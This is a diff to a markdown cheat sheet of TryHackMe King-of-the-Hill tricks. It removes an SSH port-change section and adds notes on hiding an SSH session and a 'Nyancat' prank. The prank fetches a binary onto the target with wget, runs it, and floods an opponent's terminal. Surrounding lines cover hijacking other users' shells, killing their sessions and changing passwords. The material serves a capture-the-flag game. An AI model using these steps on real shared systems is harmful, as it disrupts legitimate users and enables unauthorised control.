@@ -58,50 +58,6 @@ Ctrl + z
 stty raw -echo;fg
 ```
 
-## Changing the SSH port (AGAINST RULES/NOT RECOMMENDED)
-
-* to change the ssh port, we will use the following command
-
-```
-nano /etc/ssh/sshd_config
-```
-* now we notice that SSH by default port is on port 22
-
-```
-Include /etc/ssh/sshd_config.d/*.conf
-
-#Port 22
-#AddressFamily any
-#ListenAddress 0.0.0.0
-#ListenAddress ::
-
-#HostKey /etc/ssh/ssh_host_rsa_key
-#HostKey /etc/ssh/ssh_host_ecdsa_key
-#HostKey /etc/ssh/ssh_host_ed25519_key
-```
-
-* IF YOU DO THIS, DO IT IN PRIVATE ROOMS WITH YOUR FRIENDS FOR FUN, BECAUSE IN THE PUBLIC ROOM YOU WILL BE PUNISHED !!
-
-* but we can change port 22 from SSH to a high port
-
-```
-Include /etc/ssh/sshd_config.d/*.conf
-
-Port 55999
-#AddressFamily any
-#ListenAddress 0.0.0.0
-#ListenAddress ::
-
-#HostKey /etc/ssh/ssh_host_rsa_key
-#HostKey /etc/ssh/ssh_host_ecdsa_key
-#HostKey /etc/ssh/ssh_host_ed25519_key
-```
-
-* now just restart the ssh service to change which port you chose
-
-```
-service sshd restart
- ```
 ## breaking into the shell of users logged into SSH (NOT RECOMMENDED,DO THIS ONLY IN PRIVATE ROOMS WITH YOUR FRIENDS FOR FUN)
 
 * you can use the following command to break into the shell of other logged in users
@@ -132,6 +88,15 @@ pkill -9 -t pts/1
 
 * as explained in some examples above, just put the pts of the user you want to remove from the machine
 
+
+## hiding your ssh session
+
+* You can use the following command to hide your session from tty.
+
+```
+ssh -t
+```
+
 ## changing ssh user password
 
 * to change a user's password just use the following command
@@ -141,6 +106,27 @@ passwd [UserName]
 ```
 
 * you can change ssh keys
+
+# Nyancat
+
+## Preparing the Nyancat
+
+> git clone https://github.com/klange/nyancat
+
+> cd nyancat/src
+
+> make
+
+## Sending Nyancat to machine
+
+> python -m SimpleHTTPServer 80 # on your local machine
+
+> wget http://yourip/nyancat # on the KOTH machine
+
+> chmod +x nyancat
+
+> ./nyancat > /dev/pts/# < here where is the # you will place the enemy PTS where I explained it here in this koth tryhackme tricks.
+
 
 ## defending box
 
